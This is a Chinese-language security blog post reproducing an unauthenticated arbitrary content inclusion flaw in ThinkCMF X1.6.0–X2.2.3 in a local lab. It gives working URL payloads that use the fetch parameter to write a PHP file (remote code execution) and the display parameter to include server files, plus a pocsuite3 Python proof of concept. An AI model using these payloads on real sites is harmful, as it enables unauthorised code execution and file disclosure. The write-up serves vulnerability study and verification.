---
title:  ThinkCMF框架任意内容包含漏洞复现
date: 2019-10-24 11:23:43
author: dylan
top: false
cover: false
password: 
categories: web安全
tags: 
    - ThinkCMF
    - 任意内容包含
    - 漏洞复现
---

# 0x00 漏洞概述

ThinkCMF是一款基于PHP+MYSQL开发的中文内容管理框架，底层采用ThinkPHP3.2.3构建。

利用此漏洞无需任何权限情况下，构造恶意的url，可以向服务器写入任意内容的文件，实现远程代码执行。

# 0x01 影响范围

* ThinkCMF X1.6.0
* ThinkCMF X2.1.0
* ThinkCMF X2.2.0
* ThinkCMF X2.2.1
* ThinkCMF X2.2.2
* ThinkCMF X2.2.3

# 0x02 漏洞复现
## 环境搭建

本地使用phpstudy搭建`ThinkCMF X2.2.3`

记得使用`Nginx`服务器，不然安装界面会提示没有权限。

`You don't have permission to access / on this server.`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191024121247.png)

根据安装向导安装即可

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191024121445.png)

## 漏洞利用

**第一种**
通过构造a参数的fetch方法，可以不需要知道文件路径就可以把php代码写入文件

phpinfo版payload如下：

`?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('test.php','<?php phpinfo(); ?>')</php>`

执行结果如下：

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191024121913.png)

访问写入的文件

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191024122021.png)


**第二种**

通过构造a参数的display方法，实现任意内容包含漏洞

payload:

`?a=display&templateFile=README.md`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191024122420.png)

## POC

```
#! python3
"""

@FileName: thinkcmf_2_2_3_file_inclusion.py
@Author: dylan
@software: PyCharm 
@Datetime: 2019-10-24 13:55

"""

import urllib.parse
from pocsuite3.api import Output, POCBase, register_poc, requests, logger


class DemoPOC(POCBase):
    vulID = "0"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "3.0"  # 默认为1
    author = "dylan"  # PoC作者的大名
    vulDate = "2019/10/24"  # 漏洞公开的时间,不知道就写今天
    createDate = "2019/10/24"  # 编写 PoC 的日期
    updateDate = "2019/10/24"  # PoC 更新的时间,默认和编写时间一样
    references = [
        "https://dylan903.coding.me/2019/10/24/thinkcmf-kuang-jia-ren-yi-nei-rong-bao-han-lou-dong-fu-xian/"]  # 漏洞地址来源,0day不用写
    name = "thinkcmf_2_2_3_file_inclusion"  # PoC 名称
    appPowerLink = ""  # 漏洞厂商主页地址
    appName = "ThinkCMF"  # 漏洞应用名称
    appVersion = 'ThinkCMF X1.6.0、X2.1.0、X2.2.0、X2.2.1、X2.2.2、X2.2.3'  # 漏洞影响版本
    vulType = "File Inclusion"  # 漏洞类型,类型参考见 漏洞类型规范表
    desc = """

    """  # 漏洞简要描述
    samples = [""]  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = """

    """

    def _verify(self):
        # 验证代码
        result = {}
        payload1 = '?a=fetch&templateFile=public/index&prefix=%27%27&content=<php>file_put_contents(%27test.php%27,' \
                   '%27hello world!%27)</php> '
        payload2 = '?a=display&templateFile=Nginx.conf'
        path1 = self.url + payload1
        path2 = self.url + payload2
        
        respose1 = requests.get(path1, verify=False, timeout=30)
        respose2 = requests.get(self.url + "/test.php", verify=False, timeout=30)
        respose3 = requests.get(path2, verify=False, timeout=30)
        
        if 'hello world!' in respose2.text:  # result是返回结果
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['VUL1'] = "目标存在文件写入漏洞"
        if 'location' in respose3.text:
            result['VerifyInfo']['VUL2'] = "目标存在文件包含漏洞"

        return self.parse_output(result)

    def _attack(self):
        # 攻击代码
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail("Internet nothing returned")
        return output


# 注册 DemoPOC 类
register_poc(DemoPOC)
```

# 参考文章
[ThinkCMF框架上的任意内容包含漏洞 - FreeBuf互联网安全新媒体平台](https://www.freebuf.com/vuls/217586.html)
[ThinkCMF框架任意内容包含漏洞分析复现](https://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247483900&idx=1&sn=028d4d1c0f804af29594380de17ebf93)